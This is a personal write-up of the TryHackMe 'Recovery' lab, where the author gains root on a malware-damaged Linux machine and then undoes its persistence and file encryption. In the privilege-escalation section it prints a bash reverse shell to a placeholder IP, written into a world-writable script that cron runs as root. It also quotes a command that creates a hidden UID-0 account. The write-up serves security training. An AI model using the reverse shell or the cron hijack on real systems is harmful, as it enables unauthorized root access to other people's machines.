# Recovery - TryHackMe Write-Up

**Platform:** TryHackMe

**Difficulty:** Hard

**Operating System:** Linux

**Note:** This write-up documents a penetration test conducted in a virtual environment hosted by TryHackMe. The machine was designed for authorized security training.

## Tools Used

* Nmap
* Dirsearch
* Netcat
* Linux command-line utilities
* Python

---

# 1. Executive Summary

**Recovery** is a Linux machine focused on incident investigation, privilege escalation, and recovering a compromised web server.

The scenario describes Alex, an employee at Recoverysoft, who received an email containing a binary named `fixutil`. The email claimed that the binary would fix a recently discovered web server vulnerability. However, the binary was actually malware designed to damage the system.

After obtaining access to the machine, I investigated the suspicious scripts, persistence mechanisms, and modified system files. The investigation revealed several malicious modifications, including a persistent shell loop, a cron job executing a writable script as root, changes to the logging library, unauthorized SSH keys, an additional privileged account, and encrypted web files.

The machine required more than simply obtaining root access. The final objective was to investigate and repair the damage caused by the malware.

---

# 2. Initial Reconnaissance

I started by performing a full TCP port scan to identify the services exposed by the machine.

```bash
nmap -p- -sCV -Pn <IP> --min-rate 1000
```

The scan revealed the following open ports:

```
22/tcp      open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2
80/tcp      open  http    Apache httpd 2.4.43
1337/tcp    open  http    nginx 1.14.0 (Ubuntu)
65499/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
```

The two SSH services and two HTTP services stood out as potential areas for further investigation.

---

# 3. Web Enumeration

I started enumerating the web server to discover accessible directories and endpoints.

During directory enumeration, I discovered the following CGI paths:

```text
/cgi-bin/printenv
/cgi-bin/test-cgi
```

Both endpoints returned HTTP `200` responses.

At first, I did not immediately identify a useful exploitation path. However, the presence of CGI scripts was worth investigating because their configuration and implementation could expose additional functionality.

## A Funny Moment

Before finding these endpoints, I had taken a **very long nap** and dreamed that I needed to search for directories.

In the dream, I apparently saw something like:

```
produce
```

or:

```
production
```

After waking up, I started enumerating directories and eventually found the CGI endpoints.

My brain was apparently doing reconnaissance while I was sleeping.

---

# 4. Initial Access

After obtaining the initial access information provided by the machine, I connected through SSH.

```
ssh alex@<IP>
```

This allowed me to interact with the system as the `alex` user.

However, the shell was affected by a persistent message loop that made normal interaction difficult.

---

# 5. Getting Past the Shell Loop

When logging in as `alex`, the terminal repeatedly displayed:

```
YOU DIDN'T SAY THE MAGIC WORD!
```

The output continued because an infinite loop was being executed when the Bash shell started.


So i've added `/bin/bash` to the SSH command, this provided a way to interact with the system without immediately triggering the same Bash startup behavior.

```
ssh alex@<IP> /bin/bash
```
## Flag 0 — Fixing `.bashrc`

I inspected the user's shell configuration:

```
cat ~/.bashrc
```

The last line contained the following code:

```
while :; do echo "YOU DIDN'T SAY THE MAGIC WORD!"; done &
```

The loop continuously printed the message in the background.

Because `alex` used `/bin/bash` as the login shell, the configuration was executed when starting a Bash session.

I removed the malicious loop from `.bashrc`, restoring normal shell interaction.

Afterward, I checked the web service running on port `1337` to retrieve the first flag.

---

# 6. Investigating the Damage

After fixing the `.bashrc` issue, I started looking around Alex's home directory to understand what had happened to the machine.

While inspecting the files in the directory, I found the fixutil binary.

Instead of immediately trying to reverse engineer it with a dedicated tool, I started investigating the files and readable information available on the system.

I read the relevant files directly using ``cat`` and started taking note of anything that looked suspicious or related to persistence.

During this process, I found several interesting references, including:

```
/root/.ssh/authorized_keys
/etc/passwd
/etc/shadow
/opt/brilliant_script.sh
/lib/x86_64-linux-gnu/liblogging.so
/tmp/logging.so
/opt/.fixutil/backup.txt
/usr/local/apache2/htdocs
```

These references gave me a good idea of what fixutil had modified on the machine.

I then started investigating each of these locations individually.

# 7.Getting Root Access

While investigating the files, I also noticed that brilliant_script.sh was being executed by a cron job as root.

I checked its permissions:

``ls -la /opt/brilliant_script.sh``

The script was writable by my current user:

``-rwxrwxrwx ... brilliant_script.sh``
I then checked the cron configuration and processes and found:

``/etc/cron.d/evil``

which contained:

``* * * * * root /opt/brilliant_script.sh 2>&1 >/tmp/testlog``

This meant that the script was executed periodically with root privileges.

I decided to use this to obtain a root shell.

I replaced the contents of the script with a reverse shell:

```
echo '#!/bin/bash
bash -i >& /dev/tcp/<YOUR_IP>/900 0>&1' > /opt/brilliant_script.sh
```

When I executed the script, I received a connection back.

However, the machine still had some of the strange shell behavior caused by the modifications to the system.

The output included:

``YOU DIDN'T SAY THE MAGIC WORD!``

Even so, by keeping the listener running and waiting for the cron job to execute the script, I eventually received the shell with root privileges.

---

# 8. Investigating fixutil

With root access, I continued investigating what the malware had changed.

I did not use Ghidra for this. 

Instead, I relied heavily on the readable information I could find directly on the system.

I inspected the relevant files using commands such as:

``cat <file>``
and followed the paths and commands that looked suspicious.

This led me to several important artifacts.

# 9. Restoring liblogging.so

One of the things I found while investigating the readable information was a reference to:

``/tmp/logging.so``

and:

``/lib/x86_64-linux-gnu/oldliblogging.so``

This indicated that the original liblogging.so had been backed up under another name.

I inspected the files and restored the original library to:

``/lib/x86_64-linux-gnu/liblogging.so``

After restoring it, I checked the web server and obtained the corresponding flag.

# 10.Flag 3 - Removing the Unauthorized SSH Key

Another suspicious reference I found was:

``/root/.ssh/authorized_keys``

I inspected the file:

``cat /root/.ssh/authorized_keys``

There was an unauthorized SSH key that had been added to the root account.

I removed the malicious entry and restored the file.

After fixing the SSH configuration, I checked the web server again and retrieved the next flag.
---
# 11. Flag 4 - Removing the Unauthorized User

While investigating the system, I also found evidence of an additional user named:

``security``

The relevant command referenced:

``/usr/sbin/useradd --non-unique -u 0 -g 0 security``

The important detail here is the UID:

0

UID 0 corresponds to the root user.

I inspected the account files:

cat /etc/passwd
cat /etc/shadow

and found the security account.

I removed the corresponding entries from both files.

After removing this persistence mechanism, I checked the web server again and retrieved the next flag.

# 12. Flag 5 - Recovering the Encrypted Web Files

The next part involved recovering the web server's files.

While investigating the system, I found:

``/opt/.fixutil/backup.txt``

I read the file:

``cat /opt/.fixutil/backup.txt``

and found:

``AdsipPewFlfkmll``

This turned out to be the key used to recover the encrypted web files.

The affected files were located under:

``/usr/local/apache2/htdocs/``

I transferred copies of the files to my machine (using netcat) and got a small Python script (in a walkthrough) to reverse the XOR operation:
```
key = b"AdsipPewFlfkmll"
fil = "index.html"

with open(fil, "rb") as f:
    contents = f.read()

for i in range(len(contents)):
    print(chr(contents[i] ^ key[i % len(key)]), end="")
```

I then did this processes over and over, changing the file parameter to their respective files
After decoding all of them, I've used the command ``echo`` to overwrite all the encrypted web files. Because I did not have a TTY shell, this actually more difficult to restore the web files

The server was restored and I got the last flag

---
# 13. Final Thoughts

Recovery was a particularly annoying machine for me, but it ended up being a pretty interesting CTF.

What I liked most about the machine was that I didn't need to completely reverse engineer fixutil to understand what it had done, but it was kinda of a bad idea of not using ghidra

I mostly followed the information available directly on the system:
```
find file -> read it -> notice suspicious paths and commands -> investigate it -> repeat
```

The biggest lesson for me was that enumeration doesn't always mean running a huge amount of tools. Sometimes simply reading the files that are already sitting in front of you and following the clues they contain can reveal the entire attack chain.


The lack of a proper TTY made the final file recovery much harder than necessary. Next time, I would prioritize stabilizing the shell early and investigating the malware systematically before attempting to restore the damaged files.

Still, it was a fun CTF and a good exercise in investigating a compromised Linux machine.
